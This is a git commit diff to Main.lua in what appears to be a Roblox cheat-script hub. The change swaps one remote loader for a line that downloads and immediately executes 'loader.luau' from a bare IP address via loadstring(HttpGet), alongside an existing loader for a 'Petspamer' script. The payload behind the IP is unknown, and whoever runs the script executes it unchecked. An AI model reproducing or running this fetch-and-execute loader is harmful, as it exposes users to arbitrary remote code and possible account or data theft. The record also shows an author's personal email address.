d04a90d9919081cba987f5202b9170e8fcf62c4e
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-08-29 15:55:08 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,2 +1,3 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/Petspamer.lua"))()
-loadstring(game:HttpGet("https://pastefy.app/Tx6iFYND/raw"))()
+ID="b5bd87ab-c631-494c-9b65-aa0f5b823563";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
